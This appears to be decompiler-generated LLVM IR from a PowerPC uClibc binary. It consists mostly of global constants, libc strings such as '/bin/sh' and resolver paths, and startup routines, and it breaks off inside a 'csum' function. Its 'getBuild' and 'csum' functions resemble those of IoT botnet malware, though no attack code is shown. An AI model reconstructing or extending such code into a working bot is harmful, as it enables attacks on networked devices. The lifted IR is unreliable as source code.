@global_var_10013064.971 = constant i32 1207982889
@global_var_100130ec.972 = constant i32 1207963277
@global_var_100130f0.973 = constant i32 1207970221
@global_var_100130f4.974 = constant i32 1207973757
@global_var_10013114.975 = constant i32 1207974025
@global_var_100131d4.976 = constant i32 939524096
@global_var_1001389c.977 = constant i32 1207982305
@global_var_10040d38.978 = local_unnamed_addr global [3 x i32] %wide-string
@global_var_10040d3c.979 = local_unnamed_addr global i32 64
@global_var_100451d4.980 = local_unnamed_addr global i32 0
@global_var_100450e4.981 = local_unnamed_addr global i32 32
@global_var_10013df0.982 = constant [3 x i8] c"9 \00"
@global_var_10013e84.983 = constant i32 939524096
@global_var_100450c4.984 = local_unnamed_addr global i32 -1
@global_var_100450c0 = external local_unnamed_addr global i32
@global_var_100408c0 = external global i32
@global_var_10040ab4.985 = local_unnamed_addr global i32 0
@global_var_10013f50.986 = constant i32 939524096
@global_var_100451c0.987 = local_unnamed_addr global i32 0
@global_var_100451c4.988 = local_unnamed_addr global i32 0
@global_var_100451dc.989 = local_unnamed_addr global i32 0
@global_var_10045210.990 = global i32 0
@global_var_1004520c.991 = global i32 0
@global_var_1001403c.992 = constant [3 x i8] c"8a\00"
@global_var_100450e8.993 = local_unnamed_addr global i32 33
@global_var_100450ec.994 = local_unnamed_addr global i32 34
@global_var_100451bc.995 = local_unnamed_addr global i32 0
@global_var_10045128.997 = global i32* bitcast (i16* @global_var_10044d70.996 to i32*)
@global_var_1004512c.998 = local_unnamed_addr global i32 2
@global_var_10040904.999 = local_unnamed_addr global i32* @global_var_1004520c.991
@global_var_100408d4.1000 = local_unnamed_addr global i32 0
@global_var_1004090c.1001 = local_unnamed_addr global i32* @global_var_10045210.990
@global_var_1001414c.1002 = constant i32 1207978833
@global_var_10014150.1003 = constant i32 1006632992
@global_var_100451d0.1004 = local_unnamed_addr global i32 0
@global_var_10045234.1005 = local_unnamed_addr global i32 0
@global_var_10014310.1006 = constant i32 1207959808
@global_var_100451d8.1007 = local_unnamed_addr global i32 0
@global_var_10040a5c.1008 = local_unnamed_addr global i32 0
@global_var_100451f0.1009 = local_unnamed_addr global i32 0
@global_var_10040a60.1010 = local_unnamed_addr global i32 0
@global_var_10040aa0.1011 = global i32 0
@global_var_10040d50.1012 = global i32 0
@global_var_10040abc.1013 = local_unnamed_addr global i32* @global_var_10040d50.1012
@global_var_10040c4c.1014 = local_unnamed_addr global i32 0
@global_var_10040c48.1015 = local_unnamed_addr global i32 0
@global_var_10040ab0.1016 = local_unnamed_addr global i32 0
@global_var_100451f8.1017 = local_unnamed_addr global i32 0
@global_var_100451fc.1018 = local_unnamed_addr global i32 0
@global_var_10014470.1019 = constant i32 939524101
@global_var_10040d60.1020 = global i32 0
@global_var_10014640.1021 = constant i32 1207959700
@global_var_100451c8.1022 = local_unnamed_addr global i32 0
@global_var_100451cc.1023 = local_unnamed_addr global i32 0
@global_var_10040d40.1024 = global i32 0
@global_var_10014774.1025 = constant [3 x i8] c"8`\00"
@global_var_10014838.1026 = constant [3 x i8] c"8`\00"
@global_var_10014898.1027 = constant [3 x i8] c"8`\00"
@global_var_100149fc.1028 = constant i32 1006632992
@global_var_10014ac4.1029 = constant [3 x i8] c"8`\00"
@global_var_10014b2c.1030 = constant [3 x i8] c"9 \00"
@global_var_10014ba8.1031 = constant [3 x i8] c"8`\00"
@global_var_10014c0c.1032 = constant [3 x i8] c"8`\00"
@global_var_10014c3c.1033 = constant i32 1207959648
@global_var_10014c88.1034 = constant i32 1207959572
@global_var_10014c9c.1035 = constant [3 x i8] c"8`\00"
@global_var_10014d14.1036 = constant [3 x i8] c"8`\00"
@global_var_100150a0.1037 = constant i32 939524096
@global_var_100150b4.1038 = constant i32 1207959592
@global_var_100151e8.1039 = constant i32 1207959756
@global_var_100152d4.1040 = constant [3 x i8] c"8`\00"
@global_var_100152f8.1041 = constant [3 x i8] c"8`\00"
@global_var_100153d8.1042 = constant i32 1207959692
@global_var_1001548c.1043 = constant [3 x i8] c"8`\00"
@global_var_10015644.1044 = constant i32 1207969749
@global_var_10015694.1045 = constant i32 939524097
@global_var_10015718.1046 = constant [3 x i8] c"8`\00"
@global_var_10015720.1047 = constant [3 x i8] c"8`\00"
@global_var_10015794.1048 = constant [3 x i8] c"8`\00"
@global_var_100157b0.1049 = constant [3 x i8] c"8`\00"
@global_var_100157d8.1050 = constant [3 x i8] c"8`\00"
@global_var_100159e0.1051 = constant [3 x i8] c"8`\00"
@global_var_100159fc.1052 = constant [3 x i8] c"8`\00"
@global_var_10015a18.1053 = constant i32 1207959660
@global_var_10040ab8.1054 = local_unnamed_addr global i32 0
@global_var_100451e0.1055 = local_unnamed_addr global i32 0
@global_var_100451e4.1056 = local_unnamed_addr global i32 0
@global_var_10015dd0.1057 = constant i32 939524096
@global_var_10045100.1058 = local_unnamed_addr global i32 2
@global_var_10015fac.1060 = constant [3 x i8] c"8`\00"
@global_var_10040ae8.1061 = global i32 0
@global_var_10040af0.1062 = global i32 0
@global_var_10040aec.1063 = local_unnamed_addr global i32 0
@global_var_10040ae4.1064 = local_unnamed_addr global i32* @global_var_10040ae8.1061
@global_var_10016064.1065 = constant [3 x i8] c"8`\00"
@global_var_10016084.1066 = constant [3 x i8] c":!\00"
@global_var_100160e8.1067 = constant i32 1207960936
@global_var_1002e0a8.1068 = constant i32 -98132
@global_var_100451ec.1069 = local_unnamed_addr global i32 0
@global_var_100451e8.1070 = local_unnamed_addr global i32 0
@global_var_100163a4.1071 = constant i32 1207959580
@global_var_10016520.1072 = constant i32 1023414276
@global_var_100166f4.1074 = constant [3 x i8] c"9 \00"
@global_var_100496cc.1075 = global i32 0
@global_var_100496e4.1076 = global i32 0
@global_var_10045200.1077 = local_unnamed_addr global i32 0
@global_var_10016950.1078 = constant [3 x i8] c"9 \00"
@global_var_100169fc.1079 = constant i32 1207959676
@global_var_10016a30.1080 = constant i32 939524096
@global_var_10016a60.1081 = constant [3 x i8] c"8`\00"
@global_var_10016a78.1082 = constant [3 x i8] c"8`\00"
@global_var_10016b84.1083 = constant i32 2080375980
@global_var_10016bf0.1084 = constant i32 939524096
@global_var_10016d68.1085 = constant [3 x i8] c"8`\00"
@global_var_10016da0.1086 = constant i32 939524096
@global_var_10017010.1087 = constant i32 939524134
@global_var_1001703c.1088 = constant i32 939524134
@global_var_10017068.1089 = constant i32 939524134
@global_var_100170a4.1090 = constant i32 939524112
@global_var_100170f4.1091 = constant i32 939524107
@global_var_100171fc.1092 = constant i32 1207959792
@global_var_10017398.1093 = constant i32 1207959912
@global_var_10017564.1094 = constant i32 939524130
@global_var_1001758c.1095 = constant i32 1207959704
@global_var_100175a4.1096 = constant i32 939524097
@global_var_100175b8.1097 = constant i32 1207959660
@global_var_100175dc.1098 = constant i32 939524107
@global_var_100496f0.1099 = global i32 0
@global_var_10017864.1100 = constant [3 x i8] c"8`\00"
@global_var_10017a8c.1101 = constant i32 1207959700
@global_var_10017b9c.1102 = constant [3 x i8] c"8`\00"
@global_var_100497f4.1103 = global i32 0
@global_var_10017c28.1104 = constant i32 939524108
@global_var_1004b7f4.1105 = global i32 0
@global_var_10017c94.1106 = constant i32 939525121
@global_var_10017cc8.1108 = constant [3 x i8] c"8`\00"
@global_var_10017cf8.1109 = constant [3 x i8] c"8`\00"
@global_var_10017d64.1110 = constant [3 x i8] c"8`\00"
@global_var_10017dcc.1111 = constant [3 x i8] c"8`\00"
@global_var_10017e84.1112 = constant i32 956301313
@global_var_10017ef4.1113 = constant i32 1207959584
@global_var_10017f0c.1114 = constant i32 939524096
@global_var_1001801c.1115 = constant i32 1207959572
@global_var_10018030.1116 = constant i32 939524097
@global_var_10045208.1117 = global i32 0
@global_var_10045204.1118 = local_unnamed_addr global i32 0
@global_var_100182b0.1119 = constant i32 2080375980
@global_var_10018348.1120 = constant i32 1207959732
@global_var_100183f8.1121 = constant i32 2080375980
@global_var_100186b0.1122 = constant i32 1207959572
@global_var_100187a0.1123 = constant i32 1207959572
@global_var_10018898.1124 = constant i32 1207959564
@global_var_10018a04.1125 = constant i32 1207959812
@global_var_10018e68.1126 = constant i32 939589631
@global_var_10019558.1127 = constant i32 939524118
@global_var_10044d58.1131 = global i32 0
@global_var_10045218.1132 = local_unnamed_addr global i32 0
@global_var_1001982c.1134 = constant i32 1207967305
@global_var_1002e3c2.1135 = constant i32 9587
@global_var_1002e3c0.1136 = constant [3 x i8] c": \00"
@global_var_1004511c = external local_unnamed_addr global i32
@global_var_1002e3c4.1137 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_1004b80c.1138 = global i32 0
@global_var_10045214.1139 = local_unnamed_addr global i32 0
@global_var_10019c80.1140 = constant i32 939524118
@global_var_10019d58.1141 = constant i32 939524096
@global_var_10019d7c.1142 = constant [3 x i8] c"9`\00"
@global_var_10019dec.1143 = constant i32 1207959864
@global_var_10019e14.1145 = constant i32 1207987437
@global_var_1002e3cc.1146 = constant [8 x i8] c"/bin/sh\00"
@global_var_1002e3d4.1147 = constant [3 x i8] c"sh\00"
@global_var_1002e3d8.1148 = constant [3 x i8] c"-c\00"
@global_var_10019e9c.1149 = constant [3 x i8] c"8`\00"
@global_var_10019f18.1150 = constant i32 1207959580
@global_var_10019f2c.1151 = constant i32 939524096
@global_var_10019f90.1152 = constant i32 939524118
@global_var_10019fb4.1153 = constant i32 1207960124
@global_var_10044d40.1154 = global i32 0
@global_var_1001a1ec.1155 = constant i32 1207959560
@global_var_1001a23c.1156 = constant [3 x i8] c" c\00"
@global_var_1001a258.1157 = constant [3 x i8] c" c\00"
@global_var_1002e3e0.1158 = constant i32 0
@global_var_1001a5a4.1159 = constant i32 1207961084
@global_var_1001a6cc.1160 = constant i32 1207960764
@global_var_1002e414.1161 = constant i32 269488136
@global_var_1002e3f8.1162 = constant [6 x i8] c"(nil)\00"
@global_var_10020000.1163 = constant i32 1107361776
@global_var_1002e400.1164 = constant [7 x i8] c"(null)\00"
@global_var_1002e408.1165 = constant i32 721431808
@global_var_1001ab28.1166 = constant i32 939524096
@global_var_1002e494.1167 = constant i32 65793
@global_var_1002e47c.1168 = constant i32 524293
@global_var_1004513c = external local_unnamed_addr global i32
@global_var_1002f74e.1170 = constant i32 1
@global_var_1002e474.1171 = constant [8 x i8] c" +0-#'I\00"
@global_var_1002e41c.1172 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1002e45c.1173 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1002e450.1174 = constant i32 67343
@global_var_1002e44f.1175 = constant i32 50331911
@global_var_1002e440.1176 = constant i32 268435461
@global_var_1002e430.1177 = constant i32 520093701
@global_var_1001b4e0.1178 = constant [3 x i8] c"8a\00"
@global_var_1001b848.1179 = constant i32 1207959708
@global_var_1001b8f0.1180 = constant i32 1207959612
@global_var_1001bb60.1181 = constant i32 939589631
@global_var_1001bc14.1182 = constant i32 939524118
@global_var_1002e4b0.1183 = constant [8 x i8] c"Success\00"
@global_var_1002e4a0.1184 = constant [15 x i8] c"Unknown error \00"
@global_var_10045144.1185 = local_unnamed_addr global i32* @global_var_1002f74e.1170
@global_var_10045220.1186 = global i32 0
@global_var_1002f024.1188 = constant i32 0
@global_var_1001cf68.1189 = constant [3 x i8] c"9 \00"
@global_var_1002f084.1190 = constant i32 0
@global_var_1001d37c.1191 = constant i32 1207959560
@global_var_1001d3d8.1192 = constant [3 x i8] c"9 \00"
@global_var_1002f00c.1193 = constant i32 10
@global_var_1001d61c.1194 = constant [3 x i8] c"9 \00"
@global_var_1001d7fc.1195 = constant [3 x i8] c"8`\00"
@global_var_1002f05c.1196 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1001d9f4.1197 = constant [3 x i8] c"9 \00"
@global_var_1001da00.1198 = constant i32 939524193
@global_var_1001da68.1200 = constant i32 939524101
@global_var_1001db54.1201 = constant i32 939524124
@global_var_1001dbcc.1202 = constant i32 1207960116
@global_var_1001dbe4.1203 = constant i32 939524105
@global_var_1001dd5c.1204 = constant [3 x i8] c"9 \00"
@global_var_1002f070.1205 = constant [3 x i8] c"%x\00"
@global_var_1001dde8.1206 = constant i32 939524124
@global_var_1001de0c.1207 = constant i32 939524193
@global_var_1004d824.1208 = global i32 0
@global_var_1004da00.1209 = global i32 0
@global_var_1004d834.1210 = global i32 0
@global_var_10045068.1211 = global i32 0
@global_var_1004526c.1212 = local_unnamed_addr global i32 0
@global_var_1004eee4.1213 = global i32 0
@global_var_1001e224.1214 = constant [3 x i8] c"8`\00"
@global_var_1001e308.1215 = constant i32 939524098
@global_var_1001e348.1216 = constant [3 x i8] c"8`\00"
@global_var_1001e3b4.1217 = constant i32 1207960188
@global_var_1001e5dc.1218 = constant i32 939524106
@global_var_1001e5fc.1219 = constant [3 x i8] c"8`\00"
@global_var_1001e614.1220 = constant i32 1207959564
@global_var_1001e6f8.1221 = constant i32 939589631
@global_var_1002f094.1222 = constant [25 x i8] c"%u.%u.%u.%u.in-addr.arpa\00"
@global_var_1001e7a4.1223 = constant i32 1207959648
@global_var_1002f0b0.1224 = constant [7 x i8] c"%x.%x.\00"
@global_var_1002f0b8.1225 = constant [9 x i8] c"ip6.arpa\00"
@global_var_1001e804.1226 = constant i32 939524096
@global_var_1001e8fc.1227 = constant i32 939524100
@global_var_1001e938.1228 = constant [3 x i8] c"8`\00"
@global_var_1001ed30.1229 = constant i32 939524118
@global_var_1001ed7c.1230 = constant i32 939524118
@global_var_1001ee20.1231 = constant i32 939524118
@global_var_1001ee78.1232 = constant i32 939524097
@global_var_1001eed4.1233 = constant i32 939524118
@global_var_1004eda0.1234 = global i32 0
@global_var_10045130 = external global i32
@global_var_1001f130.1237 = constant i32 939524108
@global_var_1001f184.1238 = constant i32 939524108
@global_var_1001f238.1239 = constant [3 x i8] c"8`\00"
@global_var_1001f440.1240 = constant i32 1207959640
@global_var_1001f47c.1241 = constant i32 1207959580
@global_var_10044f68.1242 = global i32 0
@global_var_10044f80 = external global i32
@global_var_10044fa0.1244 = global i32 -1726662223
@global_var_10044f88.1245 = local_unnamed_addr global i32* @global_var_10044fa0.1244
@global_var_10044f84.1246 = global i32* @global_var_10044fa0.1244
@global_var_1002f0c4.1247 = constant i32 0
@global_var_1001f794.1248 = constant i32 939524118
@global_var_1001f9b8.1249 = constant i32 939524096
@global_var_1001fae8.1250 = constant [3 x i8] c"8`\00"
@global_var_1001fd04.1251 = constant i32 939524130
@global_var_1004501c.1252 = global i32 0
@global_var_10045224.1253 = local_unnamed_addr global i32 0
@global_var_1001fd98.1254 = constant i32 1207960933
@global_var_1001fdd4.1255 = constant i32 939589631
@global_var_10045230.1256 = local_unnamed_addr global i32 0
@global_var_1002f0ec.1257 = constant i32 -61324
@global_var_10020150.1258 = constant i32 939524118
@global_var_10045228.1259 = global i32 0
@global_var_100400a8.1260 = global i32 -1
@global_var_10045238.1261 = local_unnamed_addr global i32 0
@global_var_1004523c.1262 = local_unnamed_addr global i32 0
@global_var_1002f344.1263 = constant [10 x i8] c"/dev/null\00"
@global_var_10045240.1264 = local_unnamed_addr global i32 0
@global_var_1004522c.1265 = local_unnamed_addr global i32 0
@global_var_100206a8.1266 = constant i32 939524096
@global_var_100206c4.1267 = constant i32 939524096
@global_var_1004da2c.1268 = global i32 0
@global_var_10020718.1269 = constant i32 1207959564
@global_var_1002075c.1271 = constant i32 1207959564
@global_var_10045244.1272 = global i32 0
@global_var_10020798.1273 = constant i32 1207959580
@global_var_100207cc.1275 = constant i32 1207959564
@global_var_10020814.1276 = constant i32 1207959608
@global_var_1002083c.1277 = constant i32 1207959564
@global_var_10045250.1278 = global i32 0
@global_var_10045254.1279 = global i32 0
@global_var_1004eec4.1280 = global i32 0
@global_var_1004ee38.1281 = global i32 0
@global_var_100209a4.1282 = constant i32 1207965333
@global_var_100209fc.1283 = constant i32 1207959564
@global_var_1004528c.1284 = local_unnamed_addr global i32 0
@global_var_10020e9c.1285 = constant i32 939524180
@global_var_1002121c.1286 = constant i32 939524105
@global_var_1002f978.1287 = constant [4 x i8] c"inf\00"
@global_var_1002f97b.1289 = constant i32 4804166
@global_var_1002f988.1290 = constant i32 771763200
@global_var_1002210c.1291 = constant i32 939589631
@global_var_1002216c.1292 = constant i32 939589631
@global_var_10022228.1293 = constant i32 939524098
@global_var_1002f9d8.1294 = constant i32 -54824
@global_var_1002fa14.1295 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_10022518.1296 = constant i32 939524108
@global_var_10045034.1297 = global i32 268576652
@global_var_10022638.1298 = constant i32 939524108
@global_var_100227f8.1299 = constant i32 939524099
@global_var_1004eeb8.1300 = global i32 0
@global_var_10022cec.1301 = constant i32 1207959608
@global_var_1004daf8.1302 = global i32 0
@global_var_1004524c.1303 = local_unnamed_addr global i32 0
@global_var_1004db10.1304 = global i32 0
@global_var_10022dac.1305 = constant i32 939524097
@global_var_10022ef4.1310 = constant i32 1207959576
@global_var_10022f20.1311 = constant i32 939524096
@global_var_1002fa44.1312 = constant i32 -51720
@global_var_1002fa5c.1313 = constant i32 0
@global_var_100237ac.1314 = constant i32 1207959704
@global_var_10023820.1315 = constant i32 1207959588
@global_var_10023838.1316 = constant i32 1207959564
@global_var_10023874.1317 = constant i32 1207959564
@global_var_10023bec.1318 = constant i32 1207959560
@global_var_1002fa74.1319 = constant i32 268582368
@global_var_1002fa80.1320 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_10023f2c.1321 = constant i32 1207959664
@global_var_10023f58.1322 = constant i32 1207959620
@global_var_100240c8.1323 = constant i32 1207959600
@global_var_10024184.1324 = constant i32 1207959560
@global_var_10024220.1325 = constant [3 x i8] c"|c\00"
@global_var_10024274.1326 = constant i32 956301313
@global_var_10024320.1327 = constant [3 x i8] c"|c\00"
@global_var_10024374.1328 = constant i32 939524097
@global_var_1002440c.1329 = constant i32 1207959600
@global_var_1002454c.1330 = constant i32 1207959608
@global_var_10045258.1331 = global i32 0
@global_var_1002fadc.1332 = constant i32 0
@global_var_1002466c.1333 = constant i32 1207959568
@global_var_10024718.1334 = constant i32 1207959560
@global_var_1002faa4.1335 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_100247fc.1336 = constant i32 1207959620
@global_var_1002481c.1337 = constant i32 1207959592
@global_var_10024828.1338 = constant i32 939524096
@global_var_1002fac0.1339 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_10024930.1340 = constant i32 1207959620
@global_var_10024964.1341 = constant i32 939524096
@global_var_1002fae0.1342 = constant i32 268585416
@global_var_1004525c.1343 = local_unnamed_addr global i32 0
@global_var_1004504c.1344 = global i32 0
@global_var_10045260.1345 = local_unnamed_addr global i32 0
@global_var_1002fb08.1346 = constant [14 x i8] c"/etc/services\00"
@global_var_1002fb18.1347 = constant i32 1912602624
@global_var_1002fb1c.1348 = constant [3 x i8] c"#\0A\00"
@global_var_1002fb20.1349 = constant [3 x i8] c" \09\00"
@global_var_1002fb24.1350 = constant [3 x i8] c",/\00"
@global_var_1004db28.1351 = global i32 0
@global_var_10024f08.1352 = constant i32 939524096
@global_var_10045264.1353 = local_unnamed_addr global i32 0
@global_var_10025034.1354 = constant i32 1207959588
@global_var_10025090.1355 = constant [3 x i8] c"8a\00"
@global_var_10025170.1356 = constant i32 1207959652
@global_var_10025204.1357 = constant [3 x i8] c"8a\00"
@global_var_100252f0.1358 = constant i32 939524096
@global_var_100253a4.1359 = constant [3 x i8] c"8`\00"
@global_var_100254a8.1360 = constant i32 939524201
@global_var_100254c0.1361 = constant i32 1207959776
@global_var_1004db38.1363 = global i32 0
@global_var_10045268.1364 = local_unnamed_addr global i32 0
@global_var_100257e8.1366 = constant i32 1207960848
@global_var_10045270.1367 = local_unnamed_addr global i32 0
@global_var_1002fb28.1368 = constant i32 771751936
@global_var_1004eed4.1369 = global i32 0
@global_var_100258d8.1370 = constant [3 x i8] c"8a\00"
@global_var_100258e4.1371 = constant i32 939524097
@global_var_100259b8.1372 = constant i32 939524097
@global_var_10025a8c.1373 = constant i32 939524097
@global_var_10025ab8.1374 = constant i32 939524100
@global_var_10025b98.1375 = constant i32 1207959684
@global_var_10025d14.1376 = constant i32 939589631
@global_var_1002fb30.1377 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1002fb44.1378 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1002fb5c.1379 = constant [11 x i8] c"nameserver\00"
@global_var_1002fb68.1380 = constant [7 x i8] c"domain\00"
@global_var_1002fb70.1381 = constant [7 x i8] c"search\00"
@global_var_1002604c.1382 = constant i32 1207959568
@global_var_10026054.1383 = constant i32 939524099
@global_var_10026164.1384 = constant i32 1207959560
@global_var_100261fc.1385 = constant [3 x i8] c"8`\00"
@global_var_10045080.1386 = global i32 0
@global_var_100263c8.1387 = constant i32 939524129
@global_var_10045274.1388 = local_unnamed_addr global i32 0
@global_var_10026438.1389 = constant [3 x i8] c"8`\00"
@global_var_10026470.1390 = constant i32 939524129
@global_var_1004527c.1391 = local_unnamed_addr global i32 0
@global_var_10045278.1392 = local_unnamed_addr global i32 0
@global_var_100265f4.1393 = constant i32 1207959580
@global_var_10045280.1394 = local_unnamed_addr global i32 0
@global_var_100266b8.1395 = constant i32 939524108
@global_var_10045284.1396 = local_unnamed_addr global i32 0
@global_var_10045288.1397 = local_unnamed_addr global i32 0
@global_var_10026848.1398 = constant [3 x i8] c"8a\00"
@global_var_10026b6c.1399 = constant i32 939524171
@global_var_10026c1c.1400 = constant i32 939524105
@global_var_1002fb78.1401 = constant i32 268595884
@global_var_10027470.1402 = constant i32 1023414274
@global_var_100274ec.1403 = constant i32 939524098
@global_var_10027508.1404 = constant i32 939524192
@global_var_1002752c.1406 = constant i32 939524520
@global_var_10045291.1407 = global i32 0
@global_var_1002fb8c.1408 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_1002fba4.1409 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_10027648.1410 = constant [3 x i8] c"8`\00"
@global_var_1002fbdc.1411 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_100276d8.1412 = constant [3 x i8] c"8`\00"
@global_var_10027708.1413 = constant [3 x i8] c"8`\00"
@global_var_10027860.1418 = constant [3 x i8] c";A\00"
@global_var_1002fbf4.1419 = constant [24 x i8] c"Cannot register service\00"
@global_var_10027920.1420 = constant i32 939524096
@global_var_10045294.1421 = local_unnamed_addr global i32 0
@global_var_1002fc1c.1422 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_10027acc.1423 = constant i32 1207959664
@global_var_10027b30.1424 = constant i32 939524096
@global_var_1002fc38.1425 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1002fc44.1426 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10028228.1427 = constant i32 1207959560
@global_var_1002fe50.1428 = constant i32 0
@global_var_1002fee0.1429 = constant [13 x i8] c"RPC: Success\00"
@global_var_1002fc58.1430 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_1002fc74.1431 = constant [5 x i8] c"%s: \00"
@global_var_1002fc7c.1432 = constant [4 x i8] c" - \00"
@global_var_100284a8.1433 = constant i32 1207959608
@global_var_1002fd00.1434 = constant i32 -30224
@global_var_1002fc80.1435 = constant [13 x i8] c"; errno = %s\00"
@global_var_1002860c.1436 = constant i32 1207959776
@global_var_1002fce8.1443 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_100400b0.1444 = global i32 0
@global_var_100400ac.1445 = global i32 268517552
@global_var_10045298.11 = local_unnamed_addr global i8 0
@global_var_10045150.22 = local_unnamed_addr global i8 0
@global_var_10045154.28 = external local_unnamed_addr global i8*
@global_var_1002a5c8.103 = external local_unnamed_addr constant i8*
@global_var_1002a014.494 = external constant [10 x i8*]
@global_var_10045157.926 = external local_unnamed_addr global i8*
@global_var_10045156.927 = external local_unnamed_addr global i8*
@global_var_10045155.928 = external global i8*
@global_var_1004db54.946 = external local_unnamed_addr global i8*
@global_var_1004db58.947 = external local_unnamed_addr global i8*
@global_var_1004db5c.948 = external local_unnamed_addr global i8*
@global_var_1004db60.950 = external local_unnamed_addr global i8*
@global_var_10044d70.996 = global i16 288
@global_var_1004521c.1133 = local_unnamed_addr global i16* null
@global_var_10044dc0.1129 = local_unnamed_addr global i16 272
@2 = internal constant [3 x i8] c"\01\06\00"
@global_var_1002f02b.1187 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_10045064.1365 = local_unnamed_addr global i16 1
@global_var_10045290.1405 = local_unnamed_addr global i16 0
@global_var_1002a6e0.110 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_10045298.11, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_100400c4.13 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_100400c4.13 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_100400c4.13 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_10045298.11, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_10045298.11, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_100400bc.18, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_100400bc.18 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268511056, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32 -30520), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_1002a054.20 to i32)
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100002b44 = icmp sgt i32 %arg2, 1
  br i1 %v2_100002b44, label %dec_label_pc_10000280, label %dec_label_pc_100002bc

dec_label_pc_10000280:                            ; preds = %entry, %dec_label_pc_10000280
  %stack_var_-24.08 = phi i16* [ %v5_100002a0, %dec_label_pc_10000280 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_100002a8, %dec_label_pc_10000280 ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v2_10000290, %dec_label_pc_10000280 ], [ 0, %entry ]
  %v4_10000280 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_10000284 = load i16, i16* %stack_var_-24.08, align 2
